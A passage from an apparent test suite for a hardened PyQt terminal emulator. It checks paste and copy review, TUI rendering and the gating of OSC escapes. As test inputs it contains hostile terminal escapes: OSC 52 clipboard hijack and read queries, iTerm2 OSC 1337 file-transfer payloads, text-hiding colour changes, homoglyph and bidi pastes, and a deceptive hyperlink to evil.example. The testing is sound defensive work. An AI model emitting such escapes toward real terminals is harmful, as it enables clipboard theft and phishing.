# stripped -> ASCII only
p.insertFromMimeData(mime2)
p.dispatch_pending_paste('stripped')
eq(psent, [b'payl\r'], 'stripped paste sends ASCII only (homoglyph + bidi dropped)')
psent.clear()
# unicode -> keeps the printable homoglyph, still drops the bidi override
p.insertFromMimeData(mime2)
p.dispatch_pending_paste('unicode')
eq(psent, [('pay' + chr(0x0430) + 'l\r').encode('utf-8')],
   'unicode paste keeps the printable homoglyph but still drops the bidi override')
psent.clear()
# dispatch with nothing pending is a no-op -- a stale paste can never be re-sent
p.dispatch_pending_paste('unicode')
eq(psent, [], 'dispatch with no held paste sends nothing')

# --- paste warning: three modes (always / if-unicode default / never) ---------
eq(p.current_paste_warn(), 'unicode',
   'a new terminal defaults to warning only when a paste carries unicode/control')
_clean = QMimeData()
_clean.setText('echo ok\n')
_dirty = QMimeData()
_dirty.setText('echo ' + chr(0x0430) + '\n')

# default 'unicode': a clean ASCII paste bypasses review; a unicode one holds.
_reviews.clear(); psent.clear()
p.insertFromMimeData(_clean)
eq(_reviews, [], 'if-unicode mode: a clean ASCII paste is not questioned')
eq(psent, [b'echo ok\r'], 'if-unicode mode: the clean paste goes straight through')
_reviews.clear()
p.insertFromMimeData(_dirty)
eq(len(_reviews), 1, 'if-unicode mode: a unicode paste is questioned (held)')
p.dispatch_pending_paste('reject')

# 'never': not even a unicode/control paste holds -- it is silently sanitized to
# ASCII (the safest strip; opting out of the prompt does not opt out of safety).
p.apply_paste_warn('never')
eq(p.current_paste_warn(), 'never', 'apply_paste_warn switches the mode')
_reviews.clear(); psent.clear()
p.insertFromMimeData(_dirty)
eq(_reviews, [], 'never mode: even a unicode paste is not questioned')
eq(psent, [b'echo \r'],
   'never mode: the unicode paste is silently stripped to ASCII, not sent raw')

# 'always': even a clean ASCII paste holds for review.
p.apply_paste_warn('always')
_reviews.clear(); psent.clear()
p.insertFromMimeData(_clean)
eq(len(_reviews), 1, 'always mode: even a clean ASCII paste is questioned (held)')
eq(psent, [], 'always mode: nothing sent until a choice')
p.dispatch_pending_paste('reject')

# an unknown mode falls back to the safe default rather than trusting it.
p.apply_paste_warn('bogus')
eq(p.current_paste_warn(), 'unicode', 'an unknown paste-warn mode falls back to if-unicode')
p.apply_paste_warn('unicode')

# --- copy review (text going OUT to the clipboard; shared bar, own setting) ----
from PyQt6.QtGui import QGuiApplication as _QGA3          # noqa: E402
cp = SecureTerminal(command='/bin/cat')
cp._mode = 'show'                                        # Show keeps real glyphs
eq(cp.current_copy_warn(), 'unicode', 'a new terminal defaults copy_warn to if-unicode')
_creq = []
cp.copy_review_requested.connect(lambda raw, delay: _creq.append((raw, delay)))
# put a homoglyph line into the doc and select it
feed_output(cp, ('git ' + chr(0x0430) + 'dd\n').encode('utf-8'))
cp.selectAll()
_QGA3.clipboard().setText('OLD')
cp.copy()
ok(cp.review_pending() and len(_creq) == 1 and _QGA3.clipboard().text() == 'OLD',
   'a copy carrying unicode is HELD for review -- nothing reaches the clipboard yet')
# copy stripped -> ASCII only on the clipboard
cp.dispatch_pending_copy('stripped')
eq(_QGA3.clipboard().text(), 'git dd\n', 'copy stripped puts ASCII only (homoglyph dropped)')
# copy with unicode -> keeps the printable homoglyph
cp.selectAll(); cp.copy(); cp.dispatch_pending_copy('unicode')
eq(_QGA3.clipboard().text(), 'git ' + chr(0x0430) + 'dd\n',
   'copy with unicode keeps the printable homoglyph')
# reject -> the clipboard is left untouched
_QGA3.clipboard().setText('KEEP'); cp.selectAll(); cp.copy()
cp.dispatch_pending_copy('reject')
eq(_QGA3.clipboard().text(), 'KEEP', 'a rejected copy leaves the clipboard unchanged')
# 'never' copies as displayed without a prompt; 'always' reviews even plain ASCII
cp.apply_copy_warn('never')
_creq.clear(); _QGA3.clipboard().setText('X'); cp.selectAll(); cp.copy()
ok(not _creq and _QGA3.clipboard().text().startswith('git '),
   'never mode: a copy goes straight to the clipboard, no review')
_ascii = SecureTerminal(command='/bin/cat'); _ascii.apply_copy_warn('always')
_areq = []
_ascii.copy_review_requested.connect(lambda raw, delay: _areq.append((raw, delay)))
feed_output(_ascii, b'plain ascii\n'); _ascii.selectAll(); _ascii.copy()
ok(len(_areq) == 1, 'always mode: even a plain-ASCII copy is reviewed')
# a copy review carries NO countdown (copy is not executed): delay is 0
eq(_areq[0][1], 0, 'copy review requests delay 0 (no anti-fat-finger gate needed)')
_ascii.dispatch_pending_copy('reject')
cp.apply_copy_warn('bogus')
eq(cp.current_copy_warn(), 'unicode', 'an unknown copy-warn mode falls back to if-unicode')

# the STANDARD right-click Copy fires Qt's non-virtual C++ copy(), which would
# bypass the reviewed copy() override; the terminal reroutes it so a context-menu
# copy is reviewed too (not just Ctrl+Shift+C).
cp.apply_copy_warn('unicode')
from PyQt6.QtCore import QPoint as _QPoint2                # noqa: E402
_menu = cp._reviewed_context_menu(_QPoint2(5, 5))
_copy_act = [a for a in _menu.actions() if a.objectName() == 'edit-copy'][0]
_creq.clear(); _QGA3.clipboard().setText('OLD'); cp.selectAll()
_copy_act.trigger()
ok(cp.review_pending() and len(_creq) == 1 and _QGA3.clipboard().text() == 'OLD',
   'the context-menu Copy is routed through the copy review, not straight to the clipboard')
cp.dispatch_pending_copy('reject')

# --- TUI mode (pyte is a required dependency: fail closed, do not skip) -------
ok(tui_available(), 'python3-pyte available for TUI mode')
if tui_available():
    tui = SecureTerminal(command='/bin/cat', tui=True)
    tui.resize(700, 300)
    tui.show()
    pump(50)
    ok(tui.tui_active(), 'tui active')
    # cursor addressing: place text at row 3 col 5 (1-indexed)
    tui.apply_mode('show')
    tui._stream.feed(b'\x1b[2J\x1b[3;5HPLACED')
    tui._render_tui()
    rows = tui.toPlainText().split('\n')
    hit = [(i, r.index('PLACED')) for i, r in enumerate(rows) if 'PLACED' in r]
    eq(hit[:1], [(2, 4)], 'tui cursor addressing')
    # full-screen program layout (what vim/htop/tmux emit): a box drawn with
    # box-drawing characters, cursor-addressed content, and a bottom status line.
    # In show mode the box-drawing glyphs survive; the grid places every piece.
    fs = SecureTerminal(command='/bin/cat', tui=True)
    fs.resize(700, 300)
    fs.show()
    pump(50)
    fs.apply_mode('show')
    _last = fs._screen.lines                   # actual grid height in rows
    _tl, _tr = chr(0x250C), chr(0x2510)        # box corners (vim/tmux borders)
    _h, _v = chr(0x2500), chr(0x2502)
    fs._stream.feed(('\x1b[2J\x1b[1;1H' + _tl + _h * 6 + _tr
                     + '\x1b[2;1H' + _v + ' vim  ' + _v
                     + ('\x1b[%d;1H' % _last) + '-- INSERT --').encode('utf-8'))
    fs._render_tui()
    _fr = fs.toPlainText().split('\n')
    ok(_fr[0].startswith(_tl + _h * 6 + _tr), 'tui draws the top box border')
    ok(_v + ' vim  ' + _v in _fr[1], 'tui places boxed content on row 2')
    ok(_fr[_last - 1].startswith('-- INSERT --'),
       'tui places the status line on the last row')
    # the same frame in box mode: box-drawing glyphs become _, ASCII stays
    fs.apply_mode('box')
    fs._render_tui()
    _sr = fs.toPlainText().split('\n')
    ok(_tl not in _sr[0] and '_' in _sr[0], 'box mode neutralizes box glyphs')
    ok(_sr[_last - 1].startswith('-- INSERT --'), 'box keeps the ASCII status line')
    fs.shutdown()
    # a pyte parser error on real program output (private SGR that some pyte
    # builds mishandle -- htop/vim/tmux emit these) must be contained, never
    # crash the terminal
    crash = SecureTerminal(command='/bin/cat', tui=True)
    crash.resize(700, 300)
    crash.show()
    pump(50)
    crash._feed_stream(b'\x1b[1;2;3?m')          # private SGR: pyte may raise
    crash._feed_stream(b'ok\r\n')
    crash._render_tui()
    ok('ok' in crash.toPlainText(), 'pyte parser error contained; terminal survives')
    # the rest of the pyte 0.8.0 crash-bug family (extra CSI params, a private CSI
    # final, an unhandled erase 'how', VPA under DECOM, a non-ASCII digit in a
    # param) must be swallowed by the same feed guard -- feed each, then confirm
    # later output still renders.
    for _seq in (b'\x1b[1;2A', b'\x1b[?0A', b'\x1b[3K', b'\x1b[4J',
                 b'\x1b[?6h\x1b[5d', b'\x1b[\xc2\xb3A'):
        crash._feed_stream(_seq)
    crash._feed_stream(b'ok2\r\n')
    crash._render_tui()
    ok('ok2' in crash.toPlainText(),
       'pyte crash-bug family (A/C/D/F) contained; terminal still renders')
    crash.shutdown()
    # scrolling output rendered frame-by-frame (the live path) must NOT be
    # double-spaced: _delete_grid must eat the newline joining scrollback to the
    # grid, or every scrolled row leaves a spurious empty block (a blank line
    # between each line -- seen with zsh's completion pager listing).
    ds = SecureTerminal(command='/bin/cat', tui=True)
    ds.resize(600, 300)
    ds.show()
    pump(30)
    _rows = ds._screen.lines
    for _k in range(_rows * 3):                 # enough to scroll well past one screen
        ds._feed_stream(('row%02d\r\n' % _k).encode())
        ds._render_tui()                        # one render per feed, like the timer
    _dl = ds.toPlainText().split('\n')
    _between = [i for i in range(1, len(_dl) - 1)
                if not _dl[i].strip() and _dl[i - 1].strip() and _dl[i + 1].strip()]
    eq(len(_between), 0,
       'TUI scrolling output is not double-spaced (no blank line between rows)')
    ok('row%02d' % (_rows * 3 - 1) in ds.toPlainText(),
       'the latest scrolled row is present')
    ds.shutdown()
    # per-cell bidi neutralized in box mode
    tui.apply_mode('box')
    tui._stream.feed(b'\x1b[10;1Ha\xe2\x80\xaeb')     # a U+202E b
    tui._render_tui()
    ok(chr(0x202E) not in tui.toPlainText(), 'tui bidi neutralized')
    # colour cell renders
    tui.apply_mode('show')
    tui._stream.feed(b'\x1b[12;1H\x1b[32mG\x1b[0m')
    tui._render_tui()
    ok(any(row[x].data == 'G' and row[x].fg == 'green'
           for row in [tui._screen.buffer[y] for y in range(tui._screen.lines)]
           for x in range(tui._screen.columns)), 'tui colour cell')
    # title + notification handling when allowed
    tui.apply_allow_title(True)
    titles = []
    notes = []
    tui.title_changed.connect(titles.append)
    tui.notified.connect(notes.append)
    tui._stream.feed(b'\x1b]2;My ev\xe2\x80\xaeil Title\x07')
    tui._handle_osc(b'\x1b]2;My ev\xe2\x80\xaeil Title\x07')
    ok(titles and chr(0x202E) not in titles[-1], 'tui title sanitized')
    tui._handle_osc(b'\x1b]9;done\x07')
    ok(notes and notes[-1] == 'done', 'tui notification captured')
    # off: no title emitted
    tui.apply_allow_title(False)
    before = len(titles)
    tui._stream.feed(b'\x1b]2;ignored\x07')
    ok(len(titles) == before, 'allow_title off: the guarded feed path emits no title')
    tui._handle_osc(b'\x1b]2;ignored\x07')  # guard is in _on_readable
    # --- granular OSC handlers: each off by default, honored only when enabled ---
    import base64 as _b64                                   # noqa: E402
    from PyQt6.QtGui import QGuiApplication as _QGA2         # noqa: E402
    _QGA2.clipboard().setText('ORIGINAL')
    # clipboard OSC 52 OFF by default -> a program cannot write the clipboard
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'HIJACK') + b'\x07')
    ok(_QGA2.clipboard().text() == 'ORIGINAL',
       'OSC 52 clipboard write is neutralized until osc_clipboard is enabled')
    tui.apply_osc('osc_clipboard', True)
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'pasted') + b'\x07')
    ok(_QGA2.clipboard().text() == 'pasted', 'enabled: OSC 52 writes the clipboard')
    _QGA2.clipboard().setText('SECRET')
    tui._handle_osc(b'\x1b]52;c;?\x07')                     # read query
    ok(_QGA2.clipboard().text() == 'SECRET',
       'an OSC 52 read query is DECLINED (never answered -- no exfiltration)')
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(b'a\x1b[31mb\x00c') + b'\x07')
    ok(_QGA2.clipboard().text() == 'a[31mbc',
       'a clipboard write is stripped of escape/control bytes')
    # the write filter is isprintable()-based like the paste path: a bidi override,
    # a zero-width character and a C1 control are dropped, so a program cannot
    # smuggle a look-alike or hidden character onto the SYSTEM clipboard (which a
    # later paste into any application would otherwise carry).
    _hostile = ('git' + chr(0x202E) + ' config' + chr(0x200B)
                + chr(0x85)).encode('utf-8')
    tui._handle_osc(b'\x1b]52;c;' + _b64.b64encode(_hostile) + b'\x07')
    ok(_QGA2.clipboard().text() == 'git config',
       'OSC 52 write drops bidi/zero-width/C1, like the paste sanitizer')
    # cwd OSC 7 gated + emits the safe path
    _cwds = []
    tui.cwd_changed.connect(_cwds.append)
    tui._handle_osc(b'\x1b]7;file://h/home/u/p\x07')        # osc_cwd off
    ok(_cwds == [], 'OSC 7 cwd is ignored until osc_cwd is enabled')
    tui.apply_osc('osc_cwd', True)
    tui._handle_osc(b'\x1b]7;file://h/home/u/p\x07')
    ok(_cwds == ['/home/u/p'], 'enabled: OSC 7 reports the unquoted path')
    # iTerm2 OSC 1337 has NO toggle: file transfer from untrusted output is
    # indefensible, so it can never be enabled and is always neutralized
    # (recognized, dropped, never leaked). It is not even a registered feature.
    ok('osc_iterm2' not in {_f[0] for _f in _S.OSC_FEATURES},
       'iTerm2 (OSC 1337) is not a toggleable OSC feature -- it cannot be enabled')
    _QGA2.clipboard().setText('UNTOUCHED')
    _t0, _n0, _c0 = len(titles), len(notes), len(_cwds)
    for _payload in (b'\x1b]1337;File=name=eA==;size=1:eA==\x07',   # inline file
                     b'\x1b]1337;SetUserVar=k=dg==\x07',            # shell variable
                     b'\x1b]1337;RequestUpload=format=tgz\x07'):    # file transfer
        tui._handle_osc(_payload)
    ok(len(titles) == _t0 and len(notes) == _n0 and len(_cwds) == _c0
       and _QGA2.clipboard().text() == 'UNTOUCHED',
       'OSC 1337 is always neutralized: no signal, no clipboard, no cwd, no toggle')
    # palette OSC 4/10/11: gated, and a program CANNOT hide text by moving fg==bg
    class _Cell:                                            # a default-coloured cell
        fg = bg = 'default'
        bold = reverse = underscore = False
    tui._handle_osc(b'\x1b]11;#123456\x07')                 # osc_colors OFF
    ok(tui._osc_palette == {}, 'OSC palette change is ignored until osc_colors is on')
    tui.apply_osc('osc_colors', True)
    tui._handle_osc(b'\x1b]10;#000000\x07\x1b]11;#000000\x07')   # hide attempt fg==bg
    _hidfg = tui._pyte_format(_Cell()).foreground().color().name()
    ok(_hidfg != '#000000',
       'fg==bg (via OSC 10/11) cannot hide text: the guard forces a readable colour')
    tui._fmt_cache.clear()
    tui._handle_osc(b'\x1b]10;#33cc99\x07')                 # a legit fg is applied
    ok(tui._pyte_format(_Cell()).foreground().color().name() == '#33cc99',
       'a legitimate OSC 10 foreground colour is applied')
    tui.apply_osc('osc_colors', False)
    ok(tui._osc_palette == {}, 'disabling osc_colors reverts to the theme palette')
    # a flood of palette changes is bounded: _osc_color must not render per change
    # (the timer coalesces), so this returns promptly and applies the last value.
    tui.apply_osc('osc_colors', True)
    tui._handle_osc(b''.join(b'\x1b]4;2;#%02x0000\x07' % (_i % 256)
                             for _i in range(300)))
    ok(tui._osc_palette.get(2) is not None,
       'a burst of OSC 4 palette changes is applied without per-change rendering')
    tui.apply_osc('osc_colors', False)
    # hyperlink OSC 8: gated, and surfaces the REAL target next to the visible text
    # (a link's display text can differ from where it points -- the phishing risk).
    _links = []
    tui.notified.connect(_links.append)
    tui._handle_osc(b'\x1b]8;;https://evil.example\x07Google\x1b]8;;\x07')
    ok(_links == [], 'OSC 8 hyperlinks are ignored until osc_hyperlink is enabled')
    tui.apply_osc('osc_hyperlink', True)
    tui._handle_osc(b'\x1b]8;;https://evil.example/login\x07Google\x1b]8;;\x07')
    ok(_links and 'Google' in _links[-1] and 'evil.example/login' in _links[-1],
       'a hyperlink surfaces the real target next to the display text')
    tui.shutdown()
    # mode switch is renderer-only: NO shell restart, the running program and its
    # frame survive. A program writes a full-screen frame to stdout in line mode;
    # flipping to TUI must show the frame without the pid changing. (The frame
    # goes to stdout, not through the line-discipline echo, so the raw escapes
    # reach the read path.)
    if tui_available():
        # a real program that writes a full-screen frame to stdout, then idles so
        # the child stays alive for the pid check (a temp script avoids the shell
        # quoting/escaping that a -c string would suffer through shlex).
        _script = os.path.join(tempfile.mkdtemp(prefix='st-frame-'), 'frame.sh')
        with open(_script, 'w') as _f:
            _f.write('#!/bin/sh\n'
                     'printf "HIST_LINE\\n"\n'
                     'printf "\\033[?1049h\\033[2J\\033[HFRAME_XYZ\\n"\n'
                     'sleep 30\n')
        os.chmod(_script, 0o700)
        sw = SecureTerminal(command=_script)
        _adv = []
        sw.advise_signal.connect(_adv.append)   # advisories are EMITTED, not injected
        sw.resize(700, 300)
        sw.show()
        pump(300)
        _pid = sw._pid
        ok(sw._alt_screen, 'alt-screen tracked in line mode')
        ok(sw._tui_hint_shown and any('TUI' in a for a in _adv),
           'advisory emitted (not injected into the document) for a full-screen app')
        ok('[secure-terminal]' not in sw.toPlainText(),
           'the advisory is not injected into the terminal, so it cannot be copied')
        sw.apply_tui(True)
        pump(50)
        eq(sw._pid, _pid, 'mode switch does NOT restart the shell (same pid)')
        ok('FRAME_XYZ' in sw.toPlainText(), 'running frame survives the switch to TUI')
        sw.apply_tui(False)
        pump(30)
        eq(sw._pid, _pid, 'switching back does not restart either')
        ok('HIST_LINE' in sw.toPlainText(), 'line scrollback restored on the way back')
        sw.shutdown()
else:
    # already recorded as a FAIL above; do not silently pass
    sys.stderr.write('secure-terminal-tests(widget): FAIL pyte absent, TUI-mode '
                     'assertions could not run\n')

# line mode forwards the cursor/history keys to the shell's line editor: Up/Down
# recall history, Left/Right/Home/End/Delete edit -- the arrow-up regression.
ak = SecureTerminal(command='/bin/cat')
asent = spy_writes(ak)
key(ak, Qt.Key.Key_Up)
key(ak, Qt.Key.Key_Down)
key(ak, Qt.Key.Key_Left)
key(ak, Qt.Key.Key_Right)
key(ak, Qt.Key.Key_Home)
key(ak, Qt.Key.Key_End)
key(ak, Qt.Key.Key_Delete)
eq(asent, [b'\x1b[A', b'\x1b[B', b'\x1b[D', b'\x1b[C', b'\x1b[H', b'\x1b[F', b'\x1b[3~'],
   'line mode forwards arrows/Home/End/Delete to the shell')

# default tab label is the working-directory basename, not a static "shell":
# "~" for home, else the directory name. The child forks in our cwd.
cw = SecureTerminal(command='/bin/cat')
_cwd = os.getcwd()
_expect = '~' if _cwd == os.path.expanduser('~') else (os.path.basename(_cwd) or '/')
eq(cw.cwd_basename(), _expect, 'cwd_basename matches the shell working directory')

# hovering a reveal <U+XXXX> badge shows a tooltip explaining the code point.
from PyQt6.QtWidgets import QToolTip                    # noqa: E402
from PyQt6.QtGui import QHelpEvent                      # noqa: E402
tt = SecureTerminal(command='/bin/cat')
tt.resize(700, 300)
tt.show()
tt.apply_mode('reveal')
tt._append('x' + chr(0x20AC))                 # euro renders as the <U+20AC> badge
pump(20)
_i = tt.toPlainText().index('<U+20AC>') + 3
_c = tt.textCursor()
_c.setPosition(_i)
_rect = tt.cursorRect(_c)
_vp = _rect.center()
_hv = QHelpEvent(QEvent.Type.ToolTip, _vp, tt.viewport().mapToGlobal(_vp))
tt.event(_hv)
pump(20)
ok(QToolTip.isVisible() and 'EURO SIGN' in QToolTip.text(),
   'hovering a reveal badge shows the code-point tooltip')
QToolTip.hideText()

# --- window: rename, colour, settings round-trip ------------------------------
from secure_terminal.main import (                   # noqa: E402
    MainWindow, _is_font_noise, _read_version, APP_VERSION,
)
from secure_terminal import settings                 # noqa: E402

# version: baked from debian/changelog at build, read at runtime, fail open
eq(_read_version(['/no/such/version']), 'unknown', 'missing version file -> unknown')
_vfd, _vf = tempfile.mkstemp(prefix='st-version-')
os.close(_vfd)
with open(_vf, 'w', encoding='utf-8') as _vh:
    _vh.write('1.2.3-4\n')
eq(_read_version([_vf]), '1.2.3-4', 'version file is read and stripped')
os.remove(_vf)
ok(isinstance(APP_VERSION, str) and APP_VERSION, 'APP_VERSION is a non-empty string')

# font-shaping warning filter: the qt.text.font.db flood is dropped, real
# messages pass through
ok(_is_font_noise('qt.text.font.db', 'OpenType support missing for "X", script 9'),
   'font-db warning is noise')
ok(_is_font_noise('', 'OpenType support missing for "Y"'), 'OpenType line is noise')
ok(not _is_font_noise('default', 'some real warning'), 'real message is not noise')

win = MainWindow()
win.new_tab()
# an advisory from a terminal surfaces as the window's dismissible banner, OUTSIDE
# any terminal document (never injected, so it cannot be copied as program output).
from PyQt6.QtWidgets import QPushButton as _QPushButton     # noqa: E402
# isHidden(), not isVisible(): the top-level window is never show()n here, so
# isVisible() is False for any child; isHidden() reflects the widget's own flag.
ok(win._banner.isHidden(), 'the advisory banner starts hidden')
win.current().advise_signal.emit('switch to TUI mode to view this program')
ok(not win._banner.isHidden() and 'TUI' in win._banner_label.text(),
   'a terminal advisory shows the window banner (not injected into the terminal)')
ok('switch to TUI' not in win.current().toPlainText(),
   'the advisory text is not injected into the terminal document')
win._banner.findChild(_QPushButton).click()                # the close (X) button
ok(win._banner.isHidden(), 'the banner X button dismisses it')
# an advisory belongs to the tab that raised it, not the whole window: it shows
# only while that tab is current, never over an unrelated tab (codex P2 fix).
ok(win.tabs.count() >= 2, 'two tabs available for the per-tab banner check')
_tabA = win.tabs.widget(0)
_tabB = win.tabs.widget(1)
win.tabs.setCurrentWidget(_tabA)
_tabA.advise_signal.emit('tab A: switch to TUI mode')
ok(not win._banner.isHidden() and 'tab A' in win._banner_label.text(),
   'the advisory shows while its own tab (A) is current')
win.tabs.setCurrentWidget(_tabB)
ok(win._banner.isHidden(), 'the advisory does not hang over a different tab (B)')
win.tabs.setCurrentWidget(_tabA)
ok(not win._banner.isHidden() and 'tab A' in win._banner_label.text(),
   'switching back to tab A shows its own advisory again')
win._dismiss_advisory()
ok(win._banner.isHidden(), 'dismiss clears the current tab advisory')
# OSC-use notice: a program using an OSC escape (stripped in CLI mode) raises the
# banner at most once per TYPE per tab; the type is named.
ok(win._osc_notice, 'the OSC-use notice is on by default')
_octab = win.current()
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab}
_octab.osc_used.emit('osc_clipboard')
ok(not win._banner.isHidden() and 'clipboard' in win._banner_label.text().lower(),
   'an OSC escape raises the notice banner, naming the type')
win._dismiss_advisory()
_octab.osc_used.emit('osc_clipboard')   # the SAME type again does not re-show
ok(win._banner.isHidden(), 'the OSC notice fires only once per type per tab')
_octab.osc_used.emit('osc_hyperlink')   # a DIFFERENT type does show
ok(not win._banner.isHidden() and 'hyperlink' in win._banner_label.text().lower(),
   'a different OSC type raises its own notice')
win._dismiss_advisory()
# disabled globally: a fresh tab's OSC shows nothing; re-enabling re-arms it.
win.new_tab()
_octab2 = win.current()
win.set_osc_notice(False)
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab2}
_octab2.osc_used.emit('osc_clipboard')
ok(win._banner.isHidden(), 'the OSC notice is suppressed when notices are all off')
ok((_octab2, 'osc_clipboard') not in win._osc_notified,
   'a suppressed notice does not consume the per-type state')
win.set_osc_notice(True)
_octab2.osc_used.emit('osc_clipboard')
ok(not win._banner.isHidden(), 're-enabling the toggle re-arms the OSC notice')
win._dismiss_advisory()
# per-TYPE mute: muting clipboard notices silences that type but not others.
win.set_osc_notice_type('osc_clipboard', False)
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab2}
_octab2.osc_used.emit('osc_clipboard')
ok(win._banner.isHidden(), 'a per-type muted OSC notice does not show')
_octab2.osc_used.emit('osc_colors')
ok(not win._banner.isHidden(), 'a non-muted OSC type still notifies')
win.set_osc_notice_type('osc_clipboard', True)
win._dismiss_advisory()
# turning notices OFF while showing dismisses the banner immediately.
_octab2.osc_used.emit('osc_cwd')
win.set_osc_notice(False)
ok(win._banner.isHidden(), 'switching OSC notices off dismisses a showing banner')
win.set_osc_notice(True)
# enabling "allow title / notifications" clears a stale OSC notice.
win._osc_notified = {p for p in win._osc_notified if p[0] is not _octab2}
_octab2.osc_used.emit('osc_title')
ok(not win._banner.isHidden(), 'an OSC notice is showing again')
win.set_allow_title(True)
ok(win._banner.isHidden(), 'enabling program title/notifications clears the OSC notice')
win.set_allow_title(False)
win._dismiss_advisory()
# granular OSC controls: a per-feature menu toggle for every OSC feature, applied
# to the tab, persisted, and reflected by the OSC security lamp (green/yellow/red).
ok(set(win._osc_actions) == {f[0] for f in _S.OSC_FEATURES},
   'every OSC feature has its own menu toggle')
ok(win._osc_level()[0] == '#1f8a54', 'the OSC lamp is green when all features are off')
win.set_osc('osc_hyperlink', True)                    # medium risk
ok(win._osc_level()[0] == '#e5a50a' and win.current().osc_enabled('osc_hyperlink')
   and win._osc_actions['osc_hyperlink'].isChecked(),
   'enabling a medium OSC feature dims the lamp to yellow, applies to the tab, checks the menu')
win.set_osc('osc_clipboard', True)                    # high risk
ok(win._osc_level()[0] == '#e5484d', 'enabling a high-risk OSC feature turns the lamp red')
win.set_osc('osc_hyperlink', False)
win.set_osc('osc_clipboard', False)
ok(win._osc_level()[0] == '#1f8a54', 'the lamp returns to green when the features are disabled')
# and the terminal actually EMITS osc_used (once) when a PROGRAM sends OSC to its
# stdout in line mode, and never shows the OSC text in the document. Drive it from
# a program (not typed input, which the tty would echo back in caret form).
_oscsh = os.path.join(tempfile.mkdtemp(prefix='st-osc-'), 'osc.sh')
with open(_oscsh, 'w') as _f:
    _f.write('#!/bin/sh\n'
             'printf "\\033]2;secret-title\\007visible\\n"\n'
             'printf "\\033]0;another\\007more\\n"\n'
             'sleep 2\n')
os.chmod(_oscsh, 0o700)
oscterm = SecureTerminal(command=_oscsh)
_oscfired = []
oscterm.osc_used.connect(lambda key: _oscfired.append(key))
oscterm.resize(400, 200)
oscterm.show()
pump(300)
ok(len(_oscfired) >= 1, 'the terminal emits osc_used for OSC output in CLI mode')
_osctext = oscterm.toPlainText()
ok('secret-title' not in _osctext and 'another' not in _osctext,
   'the OSC title text is never shown in the document')
ok('visible' in _osctext, 'the program output around the OSC still shows')
# finding: in TUI mode an OSC is NOT flagged "ignored" -- a title/notification may
# be handled there (allow_title), so a contradictory notice must not fire.
if tui_available():
    _tuiosc = SecureTerminal(command=_oscsh, tui=True)
    _tuifired = []
    _tuiosc.osc_used.connect(lambda key: _tuifired.append(key))
    _tuiosc.resize(400, 200)
    _tuiosc.show()
    pump(300)
    ok(not _tuifired, 'TUI mode does not flag an OSC as ignored (it may be handled)')
# turning on TUI mode auto-dismisses a "use TUI mode" (tui-kind) advisory, but NOT
# an unrelated OSC notice on the same tab (codex P2: only TUI hints are stale).
_tuitab = win.current()
win._on_advise(_tuitab, 'This program wants a full-screen interface. Turn on TUI.')
ok(not win._banner.isHidden(), 'the full-screen advisory is showing before the switch')
win.set_tui(True)
ok(win._banner.isHidden(), 'switching to TUI auto-dismisses the "use TUI mode" banner')
win.set_tui(False)
win._on_advise(_tuitab, 'An application used an OSC escape ...', 'osc')
ok(not win._banner.isHidden(), 'an OSC notice is showing')
win.set_tui(True)
ok(not win._banner.isHidden(), 'enabling TUI does NOT dismiss the OSC notice')
win.set_tui(False)
win._dismiss_advisory()
QInputDialog.getText = staticmethod(lambda *a, **k: ('build', True))
win.rename_tab(0)
eq(win.tabs.tabText(0), 'build', 'tab rename')
win.set_tab_color(0, QColor('#d83933'))
ok(not win.tabs.tabIcon(0).isNull(), 'tab colour set')
_term0 = win.tabs.widget(0)
ok(win._tab_colors.get(_term0) == '#d83933', 'tab colour stored')
win.set_tab_color(0, None)
# every tab now carries its number swatch, so the icon is never null; clearing
# the colour drops the stored colour but keeps the (neutral) numbered icon.
ok(not win.tabs.tabIcon(0).isNull(), 'tab keeps its number icon after colour cleared')
ok(win._tab_colors.get(_term0) is None, 'tab colour cleared')
# --- find in scrollback: per-tab + all-tabs, over the neutralized display text ---
from PyQt6.QtGui import QTextCursor as _QTC                  # noqa: E402
_ft = win.current()
_ft.document().setPlainText('')
feed_output(_ft, b'alpha beta\r\ndelta alpha\r\nzeta ALPHA\r\nno match\r\n')
win.show_find()
ok(not win._find_bar.isHidden(), 'Ctrl+Shift+F shows the find bar')
win._find_bar.all_tabs.setChecked(False)
win._find_bar.case.setChecked(False)
win._find_bar.input.setText('alpha')
win._find_update()
ok(len(_ft.extraSelections()) == 3,
   'case-insensitive find highlights every match (alpha x2 + ALPHA)')
eq(win._find_bar.count.text(), '3 matches', 'the match count is shown')
win._find_bar.case.setChecked(True)
win._find_update()
ok(len(_ft.extraSelections()) == 2, 'case-sensitive find excludes ALPHA')
# next/prev move the caret to a match and it is a real selection of the query
win._find_bar.case.setChecked(False)
win._find_update()
win._find_step(False)
ok(_ft.textCursor().selectedText().lower() == 'alpha',
   'Next selects a match')
# the find only ever sees display text: a query for an escape byte finds nothing
win._find_bar.input.setText('\x1b')
win._find_update()
eq(win._find_bar.count.text(), 'no matches',
   'a search for an escape byte finds nothing (only neutralized text is searchable)')
# all-tabs search: a match in ANOTHER tab is found and activates that tab
win._find_bar.input.setText('alpha')
win.new_tab()
_ft2 = win.current()
_ft2.document().setPlainText('')
feed_output(_ft2, b'unique-needle-xyz here\r\n')
win.tabs.setCurrentIndex(win.tabs.indexOf(_ft))    # start on the first tab
win._find_bar.all_tabs.setChecked(True)
win._find_bar.input.setText('unique-needle-xyz')
win._find_update()
win._find_step(False)
eq(win.current(), _ft2, 'all-tabs Next hops to the tab that has the match')
# tooltips render as an interactive, zoom-aware InfoTip (selectable + copyable),
# not the plain QToolTip you cannot enter.
from PyQt6.QtGui import QHelpEvent as _QHelpEvent            # noqa: E402
from PyQt6.QtCore import QEvent as _QEvent, QPoint as _QP    # noqa: E402
_tipbtn = _QPushButton('TUI')
_tipbtn.setToolTip('Opt-in TUI mode: higher risk, only run programs you trust.')
_filt = win._tip_filter
_he = _QHelpEvent(_QEvent.Type.ToolTip, _QP(3, 3), _tipbtn.mapToGlobal(_QP(3, 3)))
ok(_filt.eventFilter(_tipbtn, _he) is True,
   'the tooltip event is intercepted (plain QToolTip suppressed)')
_tip = _filt._tip
ok(not _tip.isHidden(), 'an InfoTip is shown for a tooltip')
ok('only run programs you trust' in _tip.text(), 'the InfoTip carries the tooltip text')
ok(bool(_tip.textInteractionFlags()
        & Qt.TextInteractionFlag.TextSelectableByMouse),
